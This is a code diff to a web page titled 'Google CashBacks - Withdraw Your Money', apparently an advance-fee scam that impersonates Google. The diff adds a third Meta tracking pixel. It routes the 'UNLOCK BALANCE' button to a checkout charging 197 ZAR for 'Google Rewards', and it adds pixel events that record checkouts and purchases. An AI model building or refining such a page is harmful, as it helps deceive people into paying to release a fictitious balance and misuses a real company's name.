@@ -19,12 +19,15 @@
             'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', '1444448173961324');
         fbq('init', '4179716432354886');
+        fbq('init', '556915953880317');
         fbq('track', 'PageView');
     </script>
     <noscript><img height="1" width="1" style="display:none"
             src="https://www.facebook.com/tr?id=1444448173961324&ev=PageView&noscript=1" /></noscript>
     <noscript><img height="1" width="1" style="display:none"
             src="https://www.facebook.com/tr?id=4179716432354886&ev=PageView&noscript=1" /></noscript>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=556915953880317&ev=PageView&noscript=1" /></noscript>
     <!-- End Meta Pixel Code -->
     <title>Google CashBacks - Withdraw Your Money</title>
 
@@ -1308,8 +1311,7 @@
                     </p>
 
                     <div class="blocked-buttons">
-                        <button class="btn-google"
-                            onclick="redireccionarConUTM('https://app.quorapay.online/pay/4a72ac69-043b-4166-a229-7e2c1902846a')">
+                        <button class="btn-google" onclick="goToCheckout()">
                             UNLOCK BALANCE
                         </button>
                     </div>
@@ -1914,6 +1916,41 @@
 
         // ============ INIT ============
         updateProgress();
+
+        // ============ CHECKOUT: UNLOCK BALANCE ============
+        function goToCheckout() {
+            // Fire InitiateCheckout to both pixels
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'InitiateCheckout', {
+                    value: 197.00,
+                    currency: 'ZAR',
+                    content_name: 'Google Rewards',
+                    content_type: 'product',
+                    num_items: 1
+                });
+            }
+            // Short delay so pixel fires before redirect
+            setTimeout(function () {
+                window.location.href = 'checkout.html';
+            }, 400);
+        }
+
+        // ============ PURCHASE DETECTION (return from PayJSR) ============
+        (function () {
+            var params = new URLSearchParams(window.location.search);
+            if (params.get('payment') === 'success') {
+                if (typeof fbq !== 'undefined') {
+                    fbq('track', 'Purchase', {
+                        value: 197.00,
+                        currency: 'ZAR',
+                        content_name: 'Google Rewards',
+                        content_type: 'product'
+                    });
+                }
+                // Clean the URL
+                history.replaceState({}, document.title, window.location.pathname);
+            }
+        })();
 
         // ============ VSL FUNCTIONS ============
         const NOTIFICATION_INTERVAL = 120000; // 2 minutos
